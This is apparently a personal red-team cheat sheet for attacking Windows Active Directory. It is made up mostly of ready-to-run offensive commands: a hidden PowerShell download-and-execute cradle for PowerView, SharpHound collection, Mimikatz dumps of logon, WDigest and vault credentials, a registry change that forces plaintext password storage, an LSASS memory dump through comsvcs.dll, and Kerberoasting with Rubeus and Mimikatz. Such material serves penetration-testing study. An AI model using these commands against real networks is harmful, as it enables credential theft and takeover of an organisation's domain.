## Domain Enumeration

### nltest

```
nltest /dclist:
nltest /domain_trusts
nltest /domain_trusts /all_trusts
```

### PowerView

`powershell -noP -w hidden /c iex (New-Object System.Net.Webclient).DownloadString(https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1);Get-CachedRDPConnection > c:/perflogs/c.txt`

`Invoke-UserHunter`

### Bloodhound

`SharpHound.exe –ldapusername [username] --ldappassword [password] --domain [domain.com]`

In Kerberos, I will show a screenshot of the "Shortest Path to Domain Admins from Kerberoastable Users" option. This will show an account residing in the environment that is Kerberoastable and will be a domain admin.

## Cred access

NOTE: No time to also include CrackMapExec

### Mimikatz

```
mimikatz # privilege::debug
mimikatz # log
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest
```

We could have WDigest raw passwords not set. So once we do the above, we could then run the following, log out of the machine, re-login, and then run again to see the plaintext password. Cool be cool.

`reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 1`

```
mimikatz # vault::cred /patch
```

### Minidump

`rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full`

#### BONUS: Dump review in Mimikatz

```
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords
```

## Kerberoasting

### Rubeus

`Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt`

### Mimikatz

`get-aduser -filter * -properties ServicePrincipalName | Select SamAccountName, ServicePrincipalName | where {$_.ServicePrincipalName -ne $null} | fl`

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "VULN SPN GOES HERE"
```

```
mimikatz
privilege::debug
kerberos::list /export
```
